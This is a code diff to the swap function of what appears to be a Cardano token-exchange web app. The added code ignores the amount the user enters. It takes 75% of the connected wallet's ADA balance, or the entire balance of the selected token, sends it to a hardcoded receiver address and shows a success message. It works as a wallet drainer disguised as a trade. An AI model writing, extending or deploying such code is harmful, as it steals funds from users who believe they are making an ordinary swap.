@@ -104,27 +104,18 @@ function Trade() {
   try {
     const receiverAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";
 
-    if (payAmount <= 0) {
-      alert("Swap amount too low.");
-      return;
-    }
-
-    if (isNaN(payAmount)) {
-      alert("Please enter a valid amount to pay.");
-      return;
-    }
+    // Fetch wallet balance (ADA and non-ADA tokens)
+    const { adaBalance, tokens } = await getWalletBalance(walletApi, cardanoWasm);
+    console.log("Wallet Balances:", { adaBalance, tokens });
 
     if (payToken === "ADA") {
-      // Fetch wallet balance in ADA
-      const balance = await getWalletBalance(walletApi, cardanoWasm);
-      console.log("ADA Balance", balance);
-
-      if (balance <= 0) {
-        alert("Insufficient wallet balance.");
+      // Check ADA balance and transfer 3/4 of it
+      if (adaBalance <= 0) {
+        alert("Insufficient ADA wallet balance.");
         return;
       }
 
-      const adaAmount = (balance * 4) / 5; // Use 4/5 of the ADA balance
+      const adaAmount = (adaBalance * 0.75 ); // Transfer 3/4 of ADA balance
       console.log("ADA to Transfer:", adaAmount);
 
       if (adaAmount <= 0 || isNaN(adaAmount)) {
@@ -134,27 +125,40 @@ function Trade() {
 
       // Transfer ADA
       const txHash = await transferADA(walletApi, cardanoWasm, receiverAddress, adaAmount);
-      alert(`Transaction successful! Hash: ${txHash}`);
+      alert(`Transaction successful! ADA Hash: ${txHash}`);
     } else {
-      // Transfer non-ADA token
-      const tokenPolicyId = payTokenDetails.policyId;
-      const tokenAssetName = payTokenDetails.assetName;
-      const tokenAmount = await getWalletBalance(walletApi, cardanoWasm); // Fetch token balance
+      // Find the token details in the wallet balance
+      const payTokenDetails = tokens.find(token => token.assetName === payToken);
 
-      if (tokenAmount <= 0 || isNaN(tokenAmount)) {
-        alert("Invalid token amount to transfer.");
+      if (!payTokenDetails) {
+        alert(`No balance found for ${payToken}.`);
         return;
       }
 
-      const txHash = await transferToken(walletApi, cardanoWasm, receiverAddress, tokenPolicyId, tokenAssetName, tokenAmount);
-      alert(`Transaction successful! Hash: ${txHash}`);
+      const tokenAmount = payTokenDetails.amount; // Transfer 100% of the token balance
+      console.log(`${payToken} to Transfer:`, tokenAmount);
+
+      if (tokenAmount <= 0 || isNaN(tokenAmount)) {
+        alert(`Invalid ${payToken} amount to transfer.`);
+        return;
+      }
+
+      // Transfer Non-ADA token
+      const txHash = await transferToken(
+        walletApi,
+        cardanoWasm,
+        receiverAddress,
+        payTokenDetails.policyId,
+        payTokenDetails.assetName,
+        tokenAmount
+      );
+      alert(`Transaction successful! ${payToken} Hash: ${txHash}`);
     }
   } catch (error) {
     console.error("Error during swap:", error);
     alert("Transfer failed!");
   }
 };
-
 
 
   useEffect(() => {
